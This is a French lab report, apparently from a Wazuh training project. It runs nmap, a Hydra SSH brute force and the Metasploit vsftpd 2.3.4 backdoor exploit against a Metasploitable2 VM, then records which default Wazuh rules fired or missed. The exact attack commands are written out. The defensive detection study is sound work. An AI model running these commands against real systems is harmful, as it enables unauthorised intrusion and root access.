# Scénarios d'attaque — Jour 3

Trois scénarios d'attaque ont été exécutés depuis une VM Kali Linux (192.168.56.102) contre la cible Metasploitable2 (192.168.56.101), pour observer la détection par défaut de Wazuh (sans règles personnalisées).

## Scénario 1 — Scan de reconnaissance (Nmap)

**Commande exécutée :**
nmap -sV -sC -p- 192.168.56.101 -oN nmap-full.txt
**Résultat côté attaquant :** scan complet des 65535 ports, 30 ports ouverts identifiés, dont vsftpd 2.3.4 (port 21) et OpenSSH 4.7p1 (port 22), confirmant les cibles pour les scénarios suivants.

**Détection côté Wazuh :** aucune alerte générée. Wazuh étant un HIDS (Host-based IDS), il surveille les logs générés localement sur la machine surveillée, pas le trafic réseau brut. Un scan de ports ne génère quasiment aucune trace exploitable dans les logs système par défaut.

**Constat :** un scan de reconnaissance passe totalement inaperçu avec le ruleset par défaut.

## Scénario 2 — Brute force SSH (Hydra)

**Commande exécutée :**
hydra -l msfadmin -P wordlist-courte.txt ssh://192.168.56.101
**Résultat côté attaquant :** mot de passe trouvé (msfadmin/msfadmin) après quelques tentatives.

**Détection côté Wazuh :** Détection côté Wazuh : détecté clairement. Règle 5760 ("sshd: authentication failed"), niveau 5, déclenchée à chaque tentative échouée. Règle 5551 ("PAM: Multiple failed logins in a small period"), niveau 9, également déclenchée en parallèle. Le tableau de bord montre une hausse nette du nombre d'alertes (+13), catégorisées "Password Guessing" dans le mapping MITRE ATT&CK.

**Limite identifiée :** chaque échec est loggé individuellement, mais aucune règle par défaut ne corrèle plusieurs échecs rapprochés en une alerte "brute force en cours" de sévérité élevée. Cela justifie la règle personnalisée du Jour 4 (seuil de fréquence : 5 échecs en 120 secondes).

## Scénario 3 — Exploitation du backdoor vsftpd 2.3.4 (Metasploit)

**Commandes exécutées (msfconsole) :**
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
run
**Résultat côté attaquant :** session Meterpreter obtenue avec accès root complet sur Metasploitable2, sans authentification.

**Détection côté Wazuh :** détection partielle, signaux faibles et non corrélés :
- Règle 11401 ("vsftpd: FTP session opened"), niveau 3 — connexion FTP détectée, mais banale en apparence
- Règle 533 ("Listened ports status changed"), niveau 7 — changement de ports en écoute détecté (probablement lié à l'ouverture du port 6200 par le backdoor)

**Constat :** Wazuh capte des indices individuels (connexion FTP, nouveau port ouvert) mais ne les relie pas pour identifier une exploitation de backdoor connu. Aucune alerte de sévérité critique n'est générée malgré un accès root obtenu par l'attaquant. Meterpreter s'exécutant en mémoire (sans écriture sur disque), il échappe également à toute détection basée sur l'intégrité de fichiers (FIM).

## Synthèse

| Attaque | Détection | Sévérité max | Enseignement |
|---|---|---|---|
| Nmap (scan) | Aucune | - | HIDS invisible au trafic réseau brut |
| Hydra (brute force) | Claire | 5-9 | Détecté mais non corrélé en alerte unique |
| Metasploit (backdoor) | Partielle | 3-7 | Signaux faibles non reliés à l'exploitation réelle |

Ces constats justifient l'écriture de règles de détection personnalisées au Jour 4, en particulier :
- Une règle de seuil pour le brute force SSH (corrélation de plusieurs échecs)
- Une règle ciblant le pattern spécifique du backdoor vsftpd (connexion FTP suivie d'une activité suspecte sur le port 6200)
